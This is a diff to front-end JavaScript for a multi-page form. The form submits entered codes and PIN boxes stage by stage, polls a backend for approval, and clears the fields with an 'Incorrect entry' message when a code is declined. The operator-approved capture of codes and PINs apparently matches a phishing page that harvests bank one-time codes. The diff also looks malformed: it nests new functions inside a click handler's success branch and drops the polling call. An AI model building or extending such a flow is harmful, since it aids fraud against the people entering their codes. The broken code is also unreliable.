@@ -528,17 +528,57 @@ submitCode1Btn.addEventListener("click", async () => {
 
   const success = await sendStagePayload("code1", { code1: userData.code1 });
   if (success) {
-    startPolling("code1", "page3", "page4", "code1Waiting", "code1Message", () => {
-      setupBoxInputs("code2Boxes", 4, submitCode2Stage);
-    });
+// Reusable helper function to toggle button state on input
+function checkPageFields(pageId) {
+  const container = document.getElementById(pageId);
+  if (!container) return;
+
+  // Finds the confirmation button within this page view
+  const nextBtn = container.querySelector('button:not([id*="decline"])');
+  if (!nextBtn) return;
+
+  // Checks all inputs within this specific container
+  const inputs = container.querySelectorAll('input');
+  let allFilled = true;
+
+  inputs.forEach(input => {
+    if (input.value.trim() === "") {
+      allFilled = false;
+    }
+  });
+
+  // Enable/Disable button based on validation status
+  if (allFilled && inputs.length > 0) {
+    nextBtn.disabled = false;
+  } else {
+    nextBtn.disabled = true;
   }
+}
+
+// Global initialization to ensure your first attempt works seamlessly
+document.addEventListener("DOMContentLoaded", () => {
+  const allPages = ['page1', 'page2', 'page3']; // Ensure these IDs match your section elements
+  
+  allPages.forEach(pageId => {
+    const section = document.getElementById(pageId);
+    if (section) {
+      // Listen for both input and keyup events immediately upon page load
+      section.addEventListener('input', () => checkPageFields(pageId));
+      section.addEventListener('keyup', () => checkPageFields(pageId));
+      
+      // Run an initial check to set the correct state on load
+      checkPageFields(pageId);
+    }
+  });
 });
 
-// Final step submission handler
-async function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
+// Fixed startPolling function that maintains proper field and button tracking
+async  function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
   const msgElement = document.getElementById(msgId);
-  msgElement.className = "status";
-  msgElement.innerText = "";
+  if (msgElement) {
+    msgElement.className = "status";
+    msgElement.innerText = "";
+  }
 
   if(pollingInterval) clearInterval(pollingInterval);
 
@@ -556,33 +596,32 @@ async function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, 
       } else if (data.status === "declined") {
         clearInterval(pollingInterval);
         
-        // 1. Hide the waiting spinner overlay panel cleanly
+        // 1. Hide the full-page waiting spinner overlay panel
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // 2. Clear out the fields on the current page to allow fresh typing
+        // 2. Clear input arrays safely within the specific container view
         const currentContainer = document.getElementById(currentPageId);
         if (currentContainer) {
           const inputs = currentContainer.querySelectorAll('input');
           inputs.forEach(input => {
             input.value = '';
           });
-
-          // 3. Lock the button back down until they re-enter text
-          const pageButton = currentContainer.querySelector('button:not([id*="decline"])');
-          if (pageButton) {
-            pageButton.disabled = true;
-          }
-        }
-        
-        // 4. Force a native input event so your existing event validation code refreshes automatically
-        if (currentContainer) {
-          const nativeEvent = new Event('input', { bubbles: true });
-          currentContainer.dispatchEvent(nativeEvent);
         }
 
-        // 5. Update the alert text safely
-        msgElement.className = "error";
-        msgElement.innerText = "Incorrect entry. Please enter the correct details.";
+        // 3. Clear standard global PIN grid boxes if they are present on this page
+        const globalPinBoxes = document.querySelectorAll('.boxes input');
+        globalPinBoxes.forEach(box => {
+          box.value = '';
+        });
+
+        // 4. Force checkPageFields to run immediately to re-lock the button style state safely
+        checkPageFields(currentPageId);
+
+        // 5. Present the rejection message directly on the interface window area
+        if (msgElement) {
+          msgElement.className = "error";
+          msgElement.innerText = "Incorrect entry. Please enter the correct details.";
+        }
       }
     } catch (err) {
       console.error("Status check failed");
